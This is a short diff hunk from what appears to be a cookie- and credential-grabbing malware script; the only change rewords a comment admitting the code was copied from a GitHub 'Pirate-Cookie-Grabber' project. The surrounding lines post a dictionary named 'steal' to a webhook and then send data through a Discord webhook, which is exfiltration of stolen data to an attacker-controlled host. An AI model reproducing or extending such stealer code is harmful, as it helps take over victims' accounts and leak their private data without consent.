@@ -472,7 +472,7 @@ steal = {
         }
 
 requests.post("webhooker", json=steal)
-# skidded the part below this again from https://github.com/Mani175/Pirate-Cookie-Grabber/ bc my version is ass and i already skidded the other part
+# skidded the part below this again from https://github.com/Mani175/Pirate-Cookie-Grabber/ bc my version is ass and i already skidded his other part
 discord = Discord(url=webhookk)
 
 discord.post(
